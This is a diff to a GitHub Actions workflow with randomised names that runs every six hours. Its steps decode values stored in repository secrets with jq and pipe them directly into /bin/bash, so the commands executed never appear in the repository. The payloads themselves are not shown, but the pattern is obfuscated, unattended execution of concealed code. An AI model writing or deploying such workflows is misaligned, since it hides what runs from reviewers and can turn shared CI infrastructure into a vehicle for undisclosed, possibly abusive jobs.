@@ -1,24 +1,21 @@
 name: fudouding1938
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
+    - cron: '21 0/6 * * *'
 
-jobs:  # 32496
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fudouding1938
         env:
-          nj503: ${{ secrets.nj503 }}
+          mvi2735: ${{ secrets.mvi2735 }}
         run: |
-          echo $nj503 | jq -r .nw43 | /bin/bash
-          echo $aur0356 | jq -r .kizl55796 | /bin/bash
-          echo $wsflx8927 | jq -r .urg1081 | /bin/bash
-          echo $wwo409 | jq -r .r9265 | /bin/bash
-          echo $qpwgk91 | jq -r .iubv31 | /bin/bash
-          echo $veei50 | jq -r .j1 | /bin/bash
-          echo $fhclx3 | jq -r .ikg16 | /bin/bash
-          echo $k7 | jq -r .wk5 | /bin/bash
+          echo $mvi2735 | jq -r .zf24 | /bin/bash
+          echo $jekc628 | jq -r .sqbec76136 | /bin/bash
+          echo $q191 | jq -r .nfs09 | /bin/bash
 
